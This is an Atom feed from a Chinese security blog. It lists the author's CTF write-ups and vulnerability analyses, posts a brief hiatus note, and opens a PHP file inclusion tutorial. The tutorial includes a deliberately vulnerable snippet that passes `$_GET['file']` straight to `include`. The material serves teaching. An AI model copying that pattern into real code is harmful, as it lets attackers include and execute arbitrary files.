<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chybeta.github.io/"/>
  <updated>2017-10-10T04:40:26.730Z</updated>
  <id>http://chybeta.github.io/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://chybeta.github.io/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://chybeta.github.io/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-10-10T04:40:26.730Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">Code-Audit-Challenges</a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">php文件包含漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ICMSv7.0.1 admincp.class.php sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/">Flask Web开发笔记(1):程序的基本结构 </a></li>
<li><a href="https://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">hexo-rss链接问题修复方法</a></li>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/">Square CTF 2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/">BackdoorCTF 2017-Extends Me-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">CSAW CTF 2017-LittleQuery-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/">CSAW CTF 2017-Shia Labeouf-off-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">CSAW CTF 2017-Orange v1-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/">问鼎杯 CTF writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/">SEC-T CTF2017-Naughty ads-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/">SEC-T CTF2017-Sprinkler system-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/">ASISCTF2017-GSA File Server-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/">ASISCTF2017-Mathilda-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/">WeChall-PHP-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/">TWCTF 2017-Freshen Uploader-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/">TWCTF 2017-swap-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/">CSAW CTF 2017-MISC-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>博客估计要沉寂一小段时间</title>
    <link href="http://chybeta.github.io/2017/10/16/%E5%8D%9A%E5%AE%A2%E4%BC%B0%E8%AE%A1%E8%A6%81%E6%B2%89%E5%AF%82%E4%B8%80%E5%B0%8F%E6%AE%B5%E6%97%B6%E9%97%B4/"/>
    <id>http://chybeta.github.io/2017/10/16/博客估计要沉寂一小段时间/</id>
    <published>2017-10-16T05:31:04.000Z</published>
    <updated>2017-10-16T05:32:28.653Z</updated>
    
    <content type="html"><![CDATA[<p>如题。</p>
<p>：）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如题。&lt;/p&gt;
&lt;p&gt;：）&lt;/p&gt;

    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://chybeta.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含漏洞</title>
    <link href="http://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://chybeta.github.io/2017/10/08/php文件包含漏洞/</id>
    <published>2017-10-08T15:49:30.000Z</published>
    <updated>2017-10-09T16:03:13.725Z</updated>
    
    <content type="html"><![CDATA[<p>php文件包含漏洞学习<br>合上吧，没有新姿势。<br><a id="more"></a></p>
<h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
<ol>
<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a></li>
<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a></li>
<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a></li>
<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a></li>
</ol>
<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" alt=""></p>
<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" alt=""></p>
<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
